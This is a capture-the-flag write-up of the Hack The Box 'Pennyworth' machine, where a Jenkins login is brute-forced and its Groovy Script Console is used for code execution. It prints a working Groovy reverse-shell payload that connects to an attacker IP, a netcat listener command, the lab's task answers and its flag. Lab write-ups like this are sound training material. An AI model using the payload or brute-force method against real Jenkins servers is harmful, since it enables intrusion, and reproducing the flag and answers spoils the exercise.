# Hack The Box - Pennyworth

Difficulty: Very Easy  
OS: Linux  
IP: TARGET.IP  

---

# 0. Task Answers

Task 1: What does the acronym CVE stand for?  
Common Vulnerabilities and Exposures  

Task 2: What do the three letters in CIA stand for?  
confidentiality, integrity, availability  

Task 3: What is the version of the service running on port 8080?  
Jetty 9.4.39.v20210325  

Task 4: What version of Jenkins is running on the target?  
2.289.1  

Task 5: What type of script is accepted as input on the Jenkins Script Console?  
Groovy  

Task 6: What would the "String cmd" variable be equal to on Windows?  
cmd.exe  

Task 7: What command can we use instead of "ip a" on Linux?  
ifconfig  

Task 8: What switch should we use with netcat for UDP mode?  
-u  

Task 9: What is the term for making a target initiate a connection back to the attacker?  
reverse shell  

Flag:  
9cdfb439c7876e703e307864c9167a15  

---

# 1. Reconnaissance

## Nmap scan

Command:

nmap -sC -sV -p- TARGET.IP

Result:

PORT     STATE SERVICE VERSION  
8080/tcp open  http    Jetty 9.4.39.v20210325  

Notes:

- HTTP service running on port 8080  
- Jenkins instance detected  

---

# 2. Enumeration

## Web enumeration

Visit website:

http://TARGET.IP:8080/login  

Findings:

- Jenkins login panel  
- possible credential brute force target  

Directory brute force:

Tool used:

Burp Suite Intruder  

Payloads:

- top-usernames-shortlist.txt  
- 500-worst-passwords.txt  

Findings:

- response length for `root:password` differed  
- successful login obtained  

---

## Service enumeration

Service:

Jenkins on port 8080  

Findings:

- Script Console available  
- uses Groovy scripting  
- potential RCE vector  

---

# 3. Exploitation

## Vulnerability

Groovy Script Execution → Remote Code Execution  

---

## Payload

String host="10.0.0.1";  
int port=4242;  
String cmd="cmd.exe";  
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();  
Socket s=new Socket(host,port);  
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();  
OutputStream po=p.getOutputStream(),so=s.getOutputStream();  
while(!s.isClosed()){  
    while(pi.available()>0)so.write(pi.read());  
    while(pe.available()>0)so.write(pe.read());  
    while(si.available()>0)po.write(si.read());  
    so.flush();  
    po.flush();  
    Thread.sleep(50);  
    try {p.exitValue(); break;} catch (Exception e){}  
};  
p.destroy();  
s.close();  

---

## Adaptation

- changed `cmd.exe` → `/bin/bash`  
- reason: Linux target  

---

## Reverse shell

Listener:

nc -lvnp 4242  

Result:

- shell obtained  

---

# 4. Privilege Escalation

Check:

whoami  

Result:

root  

No escalation required  

---

# 5. Flags

Root flag:

cat /root/flag.txt  

Result:

9cdfb439c7876e703e307864c9167a15  

---

# 6. Lessons Learned

- Jenkins Script Console is a critical attack surface  
- brute force + response length analysis works well  
- Groovy RCE can lead to full system compromise  
- always confirm OS before executing payloads  
- reverse shells are a standard exploitation method  

---

# Tools Used

- nmap  
- Burp Suite (Intruder)  
- netcat  
- SecLists  
- PayloadsAllTheThings  

---

# References

- https://github.com/swisskyrepo/PayloadsAllTheThings  
- https://github.com/danielmiessler/SecLists  
- https://gtfobins.github.io  
